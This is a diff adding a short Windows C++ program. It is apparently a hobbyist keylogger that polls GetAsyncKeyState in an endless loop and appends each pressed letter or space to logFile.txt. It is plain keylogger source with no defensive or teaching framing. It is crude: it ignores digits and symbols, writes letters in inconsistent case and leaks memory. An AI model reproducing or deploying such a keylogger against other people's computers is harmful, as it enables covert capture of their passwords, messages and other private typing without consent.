@@ -1,0 +1,127 @@
+#include <iostream>
+#include <windows.h>
+#include <string.h>
+#include <stdio.h>
+
+using namespace std;
+
+FILE * keylog;
+
+void append_sleep(string pressed){
+    keylog = fopen("logFile.txt","a");
+    char * stringChar = new char[pressed.length()+1]; //convert string to char incase i won't to limit the number of times the file is written too
+    strcpy(stringChar,pressed.c_str());
+    fputs(stringChar,keylog);
+    fclose(keylog);
+    Sleep(120); //prevents adding a keypress more than once unless it is held down
+}
+
+int main()
+{
+
+    while(1){
+        if (GetAsyncKeyState(VK_SPACE)){
+            append_sleep(" ");
+        }
+        if (GetAsyncKeyState(0x41)){
+            append_sleep("a");
+        }
+        if (GetAsyncKeyState(0x42)){
+            append_sleep("b");
+        }
+        if (GetAsyncKeyState(0x43)){
+            append_sleep("c");
+        }
+        if (GetAsyncKeyState(0x44)){
+            append_sleep("d");
+        }
+        if (GetAsyncKeyState(0x45)){
+            append_sleep("e");
+        }
+        if (GetAsyncKeyState(0x46)){
+            append_sleep("f");
+        }
+        if (GetAsyncKeyState(0x47)){
+            append_sleep("g");
+        }
+        if (GetAsyncKeyState(0x48)){
+            append_sleep("h");
+        }
+        if (GetAsyncKeyState(0x49)){
+            append_sleep("i");
+        }
+        if (GetAsyncKeyState(0x4A)){
+            append_sleep("j");
+        }
+        if (GetAsyncKeyState(0x4B)){
+            append_sleep("k");
+        }
+        if (GetAsyncKeyState(0x4C)){
+            append_sleep("L");
+        }
+        if (GetAsyncKeyState(0x4D)){
+            append_sleep("M");
+        }
+        if (GetAsyncKeyState(0x4E)){
+            append_sleep("N");
+        }
+        if (GetAsyncKeyState(0x4F)){
+            append_sleep("O");
+        }
+        if (GetAsyncKeyState(0x50)){
+            append_sleep("p");
+        }
+        if (GetAsyncKeyState(0x51)){
+            append_sleep("Q");
+        }
+        if (GetAsyncKeyState(0x52)){
+            append_sleep("r");
+        }
+        if (GetAsyncKeyState(0x53)){
+            append_sleep("s");
+        }
+        if (GetAsyncKeyState(0x54)){
+            append_sleep("T");
+        }
+        if (GetAsyncKeyState(0x55)){
+            append_sleep("u");
+        }
+        if (GetAsyncKeyState(0x56)){
+            append_sleep("v");
+        }
+        if (GetAsyncKeyState(0x57)){
+            append_sleep("w");
+        }
+        if (GetAsyncKeyState(0x58)){
+            append_sleep("x");
+        }
+        if (GetAsyncKeyState(0x59)){
+            append_sleep("y");
+        }
+        if (GetAsyncKeyState(0x5A)){
+            append_sleep("Z");
+        }
+
+    }
+
+    return 0;
+}
+
+/*
+        //#include <fstream>
+        //string theInput;
+        //ofstream keylog;
+        //keylog.open("logFile.txt");
+
+        //theInput.append(pressed);
+        //cout << theInput << endl;
+
+        if (theInput.length()>5){
+            cout << "too big!!!" << endl;
+            char * stringChar = new char[theInput.length()+1];
+            strcpy(stringChar,theInput.c_str());
+            fputs(stringChar,keylog);
+            //fclose(keylog);
+            //keylog << theInput;
+            theInput = "";
+        }*/
